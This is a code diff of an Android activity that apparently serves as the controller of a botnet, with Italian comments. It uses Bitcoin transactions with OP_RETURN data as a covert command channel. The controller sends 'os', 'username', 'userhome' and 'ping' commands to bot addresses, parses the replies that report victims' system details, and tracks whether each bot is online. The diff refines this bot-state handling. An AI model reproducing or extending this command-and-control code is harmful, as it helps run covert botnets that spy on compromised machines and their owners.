@@ -58,32 +58,36 @@ public class BotListActivity extends AppCompatActivity {
             @Override
             public void onItemClick(AdapterView<?> parent, View view, final int position, long id) {
                 AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
+
                 builder.setTitle(R.string.title_command_dialog)
                         .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                             public void onClick(DialogInterface dialog, int which) {
                                 try {
                                     ListView lw = ((AlertDialog)dialog).getListView();
                                     Log.d("App", lw.getItemAtPosition(which).toString());
+                                    String botAddress = listView.getItemAtPosition(position).toString().split("-")[0];
                                     String command = lw.getItemAtPosition(which).toString();
-                                    switch (command) {
-                                        case("Get OS"):
-                                            //Per il momento lo manda aanche se il bot ha i soldi.........
-                                            appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
-                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
-                                            break;
-                                        case("Get Username"):
-                                            //Per il momento lo manda aanche se il bot ha i soldi.........
-                                            appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
-                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
-                                            break;
-                                        case("Get User Home"):
-                                            //Per il momento lo manda aanche se il bot ha i soldi.........
-                                            appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
-                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
-                                            break;
+                                    if (appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_ONLINE)) {
+                                        switch (command) {
+                                            case ("Get OS"):
+                                                appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                                        new Address(appState.params, botAddress));
+                                                setBotStateQuest(botAddress);
+                                                break;
+                                            case ("Get Username"):
+                                                appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                                        new Address(appState.params, botAddress));
+                                                setBotStateQuest(botAddress);
+                                                break;
+                                            case ("Get User Home"):
+                                                appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                                        new Address(appState.params, botAddress));
+                                                setBotStateQuest(botAddress);
+                                                break;
 
-                                        default:
-                                            break;
+                                            default:
+                                                break;
+                                        }
                                     }
 
                                 } catch (Exception e) {
@@ -95,19 +99,18 @@ public class BotListActivity extends AppCompatActivity {
             }
         });
 
-        //Per il momento lo manda a tutti.............
         buttonRefresh = (Button) this.findViewById(R.id.button_refresh);
         buttonRefresh.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 //Inviamo il comando solo ai bot che hanno lo stato "ok"
                 try {
-                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.indirizzi);
+                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
                 //Aggiorna lo stato dei bot in "no"
-                setNoAllBots();
+                setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_OFFLINE);
             }
         });
 
@@ -121,12 +124,28 @@ public class BotListActivity extends AppCompatActivity {
                         .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                             public void onClick(DialogInterface dialog, int which) {
                                 try {
-                                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.indirizzi);
+                                    ListView lw = ((AlertDialog)dialog).getListView();
+                                    Log.d("App", lw.getItemAtPosition(which).toString());
+                                    String command = lw.getItemAtPosition(which).toString();
+                                    switch (command) {
+                                        case ("Get OS"):
+                                            appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
+                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
+                                            break;
+                                        case ("Get Username"):
+                                            appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
+                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
+                                            break;
+                                        case ("Get User Home"):
+                                            appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
+                                            setStatoBots(appState.getBotStateOnlineString(), appState.BOT_STATE_QUEST);
+                                            break;
+                                        default:
+                                            break;
+                                        }
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
-                                //Aggiorna lo stato dei bot in "no"
-                                setNoAllBots();
                             }
                         });
                 builder.create().show();
@@ -136,42 +155,44 @@ public class BotListActivity extends AppCompatActivity {
         appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
             @Override
             public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
-                Coin value=tx.getValueSentToMe(wallet);
+                Coin value = tx.getValueSentToMe(wallet);
                 try {
-                    String mess= readOpReturn(tx);
+                    String mess = readOpReturn(tx);
 
-                    String[] v=mess.split("-");
-                    String comando=v[0];
+                    String[] v = mess.split("-");
+                    String comando = v[0];
 
-                    Log.d("App","comando: "+comando);
+                    Log.d("App", "comando: " + comando);
 
-                    String addressString=v[1];
+                    String addressString = v[1];
 
-                    Log.d("App","address:"+addressString);
+                    Log.d("App", "address:" + addressString);
 
                     switch (comando) {
-                        case("os"):
+                        case ("os"):
+                            setBotStateOnline(addressString);
                             String os = v[2];
-                            Log.d("App", "SISTEMA OPERATIV BOT: "+os);
+                            Log.d("App", "SISTEMA OPERATIV BOT: " + os);
                             break;
-                        case("ping_ok"):
-                            setOkBot(addressString);
-                            for(String s : appState.mappaIndirizzi.keySet()){
-                                Log.d("App","indirizzo "+s +" valore "+appState.mappaIndirizzi.get(s));
+                        case ("ping_ok"):
+                            setBotStateOnline(addressString);
+                            for (String s : appState.mappaIndirizzi.keySet()) {
+                                Log.d("App", "indirizzo " + s + " valore " + appState.mappaIndirizzi.get(s));
                             }
                             break;
-                        case("username"):
+                        case ("username"):
+                            setBotStateOnline(addressString);
                             String username = v[2];
                             Log.d("App", "SISTEMA OPERATIV BOT: " + username);
                             break;
-                        case("userhome"):
+                        case ("userhome"):
+                            setBotStateOnline(addressString);
                             String userhome = v[2];
-                            Log.d("App", "SISTEMA OPERATIV BOT: "+userhome);
+                            Log.d("App", "SISTEMA OPERATIV BOT: " + userhome);
                             break;
                         default:
                             break;
                     }
-
 
 
                 } catch (Exception e) {
@@ -183,12 +204,12 @@ public class BotListActivity extends AppCompatActivity {
     }
 
 
-    public void setOkBot(String address) {
-        appState.mappaIndirizzi.put(address, "ok");
+    public void setBotStateOnline(String address) {
+        appState.mappaIndirizzi.put(address, appState.BOT_STATE_ONLINE);
         appState.saveMappaIndirizzi();
         indirizzi.clear();
         for(String s : appState.mappaIndirizzi.keySet()){
-            indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
+            indirizzi.add(s + "-" + appState.mappaIndirizzi.get(s));
         }
         runOnUiThread(new Runnable() {
             @Override
@@ -198,8 +219,23 @@ public class BotListActivity extends AppCompatActivity {
         });
     }
 
-    public void setNoAllBots() {
-        appState.setStatoBots("no");
+    public void setBotStateQuest(String address) {
+        appState.mappaIndirizzi.put(address, appState.BOT_STATE_QUEST);
+        appState.saveMappaIndirizzi();
+        indirizzi.clear();
+        for(String s : appState.mappaIndirizzi.keySet()){
+            indirizzi.add(s + "-" + appState.mappaIndirizzi.get(s));
+        }
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                listaBotAdapter.notifyDataSetChanged();
+            }
+        });
+    }
+
+    public void setStatoBots(ArrayList<String> addressList, String state) {
+        appState.setStatoBots(addressList, state);
         indirizzi.clear();
         for(String s : appState.mappaIndirizzi.keySet()){
             indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
